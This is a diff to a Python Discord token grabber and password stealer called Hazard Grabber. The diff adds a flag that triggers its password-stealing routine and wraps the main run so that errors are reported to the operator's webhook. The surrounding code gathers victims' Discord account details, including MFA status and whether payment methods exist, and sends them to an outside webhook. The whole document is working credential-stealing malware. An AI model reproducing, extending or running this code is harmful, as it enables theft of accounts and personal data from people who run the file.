@@ -12,6 +12,7 @@ from urllib.request import Request, urlopen
 from datetime import datetime
 
 webhook_url = "YOUR_WEBHOOK_HERE"
+password_stealer = True
 
 languages = {
 	'da'    : 'Danish, Denmark',
@@ -154,10 +155,11 @@ def main():
 			verified = user_data['verified']
 			mfa_enabled = user_data['mfa_enabled']
 			flags = user_data['flags']
-
 			creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y・%H:%M:%S')
-
 			language = languages.get(locale)
+			if not language:
+				language = "Failed to get language"
+
 			nitro = bool(user_data.get("premium_type"))
 			billing = bool(has_payment_methods(token))
 			embed = {
@@ -244,6 +246,27 @@ def HazardStealer():
 	except:
 		pass
 
-if __name__ == "__main__":
+if password_stealer:
+    HazardStealer()
+try:
 	main()
-	HazardStealer()
+except Exception as e:
+    embeds2 = []
+    webhook2 = {
+		"content": "",
+		"embeds": embeds2,
+		"username": "Hazard Err",
+		"avatar_url": "https://cdn.discordapp.com/attachments/828047793619861557/884194764159848458/pixlr-bg-result_10.png"
+	}
+    embed2 = {
+		"color": 15007744,
+        "author": {
+            "name": "Woopsie daisy",
+            "icon_url": "https://cdn.discordapp.com/attachments/828047793619861557/884194764159848458/pixlr-bg-result_10.png",
+            "url": "https://github.com/Rdimo/Hazard-Nuker#important"
+        },
+        "description": f"**Hazard Grabber Caught Error:**\n```fix\n{e}```\n They ran the file but Seems like Hazard couldn't grab their info :(",
+        }
+    embeds2.append(embed2)    
+    urlopen(Request(webhook_url, data=dumps(webhook2).encode(), headers=getheaders()))
+    pass
